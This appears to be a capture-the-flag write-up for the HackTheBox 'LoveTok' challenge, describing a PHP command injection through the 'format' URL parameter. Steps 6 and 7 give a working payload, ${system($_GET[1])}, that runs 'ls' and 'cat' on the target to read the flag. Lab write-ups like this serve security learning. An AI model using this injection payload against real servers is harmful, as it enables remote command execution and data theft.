## Issue Description
In some cases, due to insufficient validation in the URL, a command injection vulnerability may occur. By bypassing validation methods that can be found in predictable or open-source projects' source code, a command can be injected.

In this report, I will be explaining a HackTheBox challenge with a vulnerability of command injection via URL parameter.

## Steps to Reproduce
The following steps indicate a proof of concept outlined in seven(7) steps to reproduce and execute the issue.

**Step 1:**
Run “openvpn” command to connect to the HTB (HackTheBox) VPN.

**Step 2:**
Start the LoveTok instance.

**Step 3:**
Download the necessary files via “Download Files”.

**Step 4:**
Review the source files of the program within the downloaded files.

**Step 5:**
Observe that it has an insufficient validation in format parameter in TimeController.php file.

**Step 6:**
Change the URL to http://[HTBHost]/?format=${system($_GET[1])}&1=ls+/ to see the files in the programs directory. Copy the flag files name.

**Step 7:**
Change the URL to http://[HTBHost]/?format=${system($_GET[1])}&1=cat+/[file-name-from-step-6] to display the flag.

## Proof of Concept


## Affected Demographic
This vulnerability will affect the target machine because we can inject and execute commands on the target machine. Unless some commands are blocked by the target machine, all commands can be executed, and all operations can be performed on the target machine.
